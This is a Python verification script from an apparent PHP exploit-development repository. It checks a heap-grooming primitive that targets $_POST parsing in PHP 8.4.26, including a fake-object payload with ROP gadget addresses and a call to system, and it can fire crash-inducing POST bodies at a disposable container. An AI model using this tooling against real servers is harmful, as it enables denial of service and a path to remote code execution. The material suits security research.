#!/usr/bin/env python3
# INDEX: structural self-check + opt-in reachability sweep for the urlencoded $_POST OOM-bucket seat | cli | self-managed disposable php -S
"""verify_post_oom_arreclaim_seat.py - checks for primitives/groom/post_oom_arreclaim_seat.

Two layers:

1. STRUCTURAL (always, offline). Asserts the port's arithmetic: build_pad yields a
   bin-28 (PADLEN) value; the pad's estrndup temp (len+1) and ZVAL_STRINGL_FAST
   copy (24+len+1) both fall in bin 28 (so the dup `pad=` key frees a second bin-28
   slot); tail payloads sit at/after TAIL_MIN_PAD_OFF and the 16-byte val at
   VAL_PAD_OFF; the percent-encoded pad DECODES back to exactly PADLEN bytes
   (preserving the sizing for an arbitrary payload); post_body is well-formed
   urlencoded with the memshift pad, the two a[...] halves, and the pad/dup fields.

2. REACHABILITY (opt-in --fire, self-managed disposable php -S). Sweeps the memshift
   size, firing a body whose unwritten-bucket val is a NUL-free sentinel object, and
   reports per-memshift whether the worker dies -- an UNCALIBRATED reachability probe
   (does the OOM land on the walked copy and get walked?), NOT a correctness proof;
   the exact memshift/val-offset that lands controlled bytes is per-build (sweep as
   the $_FILES seats do). Firing crashes the worker; disposable container only.

Lab reuse: the structural layer needs no lab. The sweep self-manages one
`docker run --rm php:<image>-cli` per trial (docroot lab/app/, like
verify_stale_bucket_value_seat); SKIPs cleanly without docker. The repo's standing
equivalent target is cli-vuln (:8081, php -S 8.4.26, 16M) if you prefer --url.

Usage:
    python3 -I poc/primitives/groom/verify_post_oom_arreclaim_seat.py            # structural only
    python3 -I poc/primitives/groom/verify_post_oom_arreclaim_seat.py --fire \\
        [--memshifts 20000,40000,60000,80000] [--image php:8.4.26-cli] [--url URL]
"""
from __future__ import annotations

import argparse
import os
import struct
import subprocess
import sys
import time
from urllib.parse import unquote_to_bytes

_POC_ROOT = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))  # poc/
if _POC_ROOT not in sys.path:
    sys.path.insert(0, _POC_ROOT)
from common.http_urllib import http  # noqa: E402
from primitives.groom import post_oom_arreclaim_seat as seat  # noqa: E402

LAB_APP = os.path.join(_POC_ROOT, "..", "lab", "app")
SENTINEL = 0x4141414141414141   # NUL-free object ptr: a landed walk faults deref'ing it
PHP_INI = ["-d", "memory_limit=16M", "-d", "post_max_size=256M",
           "-d", "max_input_vars=1000000", "-d", "display_errors=0", "-d", "log_errors=1"]


def _bin(nbytes):
    """ZendMM small-bin data size for an emalloc of nbytes (zend_alloc_sizes.h)."""
    sizes = [8, 16, 24, 32, 40, 48, 56, 64, 80, 96, 112, 128, 160, 192, 224, 256,
             320, 384, 448, 512, 640, 768, 896, 1024, 1280, 1536, 1792, 2048, 2560, 3072]
    for s in sizes:
        if nbytes <= s:
            return s
    return None  # > largest small bin -> large alloc


def structural():
    ok = True

    def check(name, cond):
        nonlocal ok
        ok = ok and cond
        print(f"  [{'PASS' if cond else 'FAIL'}] {name}")

    val = struct.pack("<Q", SENTINEL) + struct.pack("<I", 8 | 0x100) + struct.pack("<I", 0)
    tail = {seat.TAIL_MIN_PAD_OFF: b"\xaa" * 32}
    pad = seat.build_pad(tail=tail, val=val)

    check(f"build_pad length == PADLEN ({seat.PADLEN})", len(pad) == seat.PADLEN)
    check(f"PADLEN in bin 28 ({seat.BIN28_SIZE})", _bin(seat.PADLEN) == seat.BIN28_SIZE)
    check("estrndup temp A (PADLEN+1) in bin 28", _bin(seat.PADLEN + 1) == seat.BIN28_SIZE)
    check("ZVAL_STRINGL_FAST copy B (24+PADLEN+1) in bin 28",
          _bin(24 + seat.PADLEN + 1) == seat.BIN28_SIZE)
    check("val placed at VAL_PAD_OFF", pad[seat.VAL_PAD_OFF:seat.VAL_PAD_OFF + 16] == val)
    check("tail placed at TAIL_MIN_PAD_OFF",
          pad[seat.TAIL_MIN_PAD_OFF:seat.TAIL_MIN_PAD_OFF + 32] == b"\xaa" * 32)
    check("tail below TAIL_MIN_PAD_OFF rejected", _raises(lambda: seat.build_pad(
        tail={seat.TAIL_MIN_PAD_OFF - 8: b"x"})))

    body = seat.post_body(pad, nkeys=60, memshift=40000, keylen=80000)
    fields = body.split(b"&")
    check("memshift field first", fields[0].startswith(b"memshift="))
    check("exactly one pad=<payload> + one pad=x (dup key)",
          sum(1 for f in fields if f.startswith(b"pad=")) == 2
          and body.count(b"pad=x") == 1)
    check("60 a[...][c]=v fields", sum(1 for f in fields if f.startswith(b"a%5B") or
          f.startswith(b"a[")) == 60)

    # The pad value decodes back to exactly PADLEN bytes (sizing preserved).
    payload = next(f for f in fields if f.startswith(b"pad=") and f != b"pad=x")[4:]
    dec = unquote_to_bytes(payload.replace(b"+", b"%2B"))
    check("percent-encoded pad decodes to PADLEN bytes", len(dec) == seat.PADLEN)
    check("decoded pad == pad", dec == pad)

    # fake_object_payload lays structures into the tail with leak-derived addresses.
    t2, v2 = seat.fake_object_payload(0x7ffff725e400, pivot=0x7ffff49fb8ae,
                                      pop_rdi_ret=0x7ffff7cfb7e5, ret=0x7ffff7cfb7e6,
                                      system=0x7ffff7d20490, cmd=b"id")
    check("fake_object_payload offsets all >= TAIL_MIN_PAD_OFF",
          all(o >= seat.TAIL_MIN_PAD_OFF for o in t2) and len(v2) == 16)
    check("fake_object_payload pad builds", len(seat.build_pad(tail=t2, val=v2)) == seat.PADLEN)

    print(f"\n== STRUCTURAL: {'PASS' if ok else 'FAIL'} ==")
    return ok


def _raises(fn):
    try:
        fn()
        return False
    except Exception:
        return True


def docker_ok():
    try:
        return subprocess.run(["docker", "info"], capture_output=True, timeout=10).returncode == 0
    except (FileNotFoundError, subprocess.TimeoutExpired):
        return False


def spawn(name, port, image):
    cmd = ["docker", "run", "-d", "--rm", "--name", name, "-p", f"{port}:80",
           "-v", f"{LAB_APP}:/var/www/html:ro", image, "php", *PHP_INI,
           "-S", "0.0.0.0:80", "-t", "/var/www/html"]
    return subprocess.run(cmd, capture_output=True, timeout=60).returncode == 0


def alive(base, path="/index.php", timeout=3):
    try:
        s, _ = http(base + path, timeout=timeout)
        return s == 200
    except Exception:
        return False


def wait_alive(base, timeout=10.0):
    t0 = time.time()
    while time.time() - t0 < timeout:
        if alive(base):
            return True
        time.sleep(0.3)
    return False


def fire(base, memshift):
    val = struct.pack("<Q", SENTINEL) + struct.pack("<I", 8 | 0x100) + struct.pack("<I", 0)
    pad = seat.build_pad(tail={seat.TAIL_MIN_PAD_OFF: b"\xaa" * 32}, val=val)
    body = seat.post_body(pad, memshift=memshift)
    return http(base + "/index.php", data=body,
                headers={"Content-Type": "application/x-www-form-urlencoded",
                         "Content-Length": str(len(body))}, timeout=120)


def sweep(base, memshifts):
    print(f"[sweep] {base}  (UNCALIBRATED reachability probe: does the OOM land + get walked?)")
    hits = []
    for m in memshifts:
        if not wait_alive(base, 8):
            print(f"[memshift {m}] target not back up; stop")
            break
        s, _ = fire(base, m)
        died = not alive(base, timeout=5)
        print(f"[memshift {m}] HTTP={s}  worker {'DEAD' if died else 'alive'}")
        if died:
            hits.append(m)
    return hits


def main():
    ap = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    ap.add_argument("--fire", action="store_true", help="run the disposable-container sweep")
    ap.add_argument("--url", default=None, help="target you restart by hand (else self-managed)")
    ap.add_argument("--memshifts", default="20000,40000,60000,80000")
    ap.add_argument("--image", default="php:8.4.26-cli")
    ap.add_argument("--port-base", type=int, default=18970)
    a = ap.parse_args()

    ok = structural()
    if not a.fire:
        print("[note] reachability sweep skipped; add --fire (disposable container only)")
        return 0 if ok else 1

    memshifts = [int(x) for x in a.memshifts.split(",")]
    if a.url:
        base = a.url.rstrip("/")
        if not wait_alive(base, 5):
            print(f"[SKIP] {base} not reachable")
            return 2
        hits = sweep(base, memshifts)
    else:
        if not docker_ok():
            print("[SKIP] docker unavailable; bring a target up and rerun with --url")
            return 2
        name = f"p2s-poar-{os.getpid()}"
        port = a.port_base
        if not spawn(name, port, a.image):
            print("[SKIP] docker run failed")
            return 2
        try:
            base = f"http://127.0.0.1:{port}"
            # fresh container per memshift so a kill doesn't poison later trials
            hits = []
            for m in memshifts:
                if not wait_alive(base, 10):
                    subprocess.run(["docker", "restart", name], capture_output=True, timeout=30)
                    wait_alive(base, 15)
                h = sweep(base, [m])
                hits += h
                if h:
                    subprocess.run(["docker", "restart", name], capture_output=True, timeout=30)
        finally:
            subprocess.run(["docker", "stop", "-t", "2", name], capture_output=True, timeout=15)

    print(f"\n== REACHABILITY: memshifts that killed the worker: {hits or 'none in range'} ==")
    print("   (a kill shows the OOM reached a walked destroy; controlled-byte placement at the")
    print("    sentinel still needs a per-build val-offset/leak -- see the primitive docstring)")
    return 0 if ok else 1


if __name__ == "__main__":
    sys.exit(main())
